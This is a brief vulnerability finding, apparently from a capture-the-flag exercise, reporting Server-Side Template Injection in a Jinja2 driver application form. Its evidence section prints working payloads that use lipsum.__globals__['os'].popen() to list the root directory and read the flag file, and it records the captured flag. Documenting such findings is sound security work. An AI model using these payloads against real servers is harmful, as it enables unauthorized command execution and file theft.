findings.title: Server-Side Template Injection (SSTI) in Driver Application Form
findings.description: The driver application form at /submit is vulnerable to Server-Side Template Injection (SSTI). User-supplied input in the 'name' parameter is rendered directly in a Jinja2 template without sanitization, allowing arbitrary code execution via the lipsum.__globals__['os'].popen() technique.
findings.evidence:
Flag extracted: flag{43509ba5-dc71-4a57-b55d-96e228e4ddfe}

SSTI confirmed via:
1. {{7*7}} rendered as 49
2. {{lipsum.__globals__['os'].popen('ls /').read()}} returned directory listing including FLAG.txt
3. {{lipsum.__globals__['os'].popen('cat /FLAG.txt').read()}} returned the flag
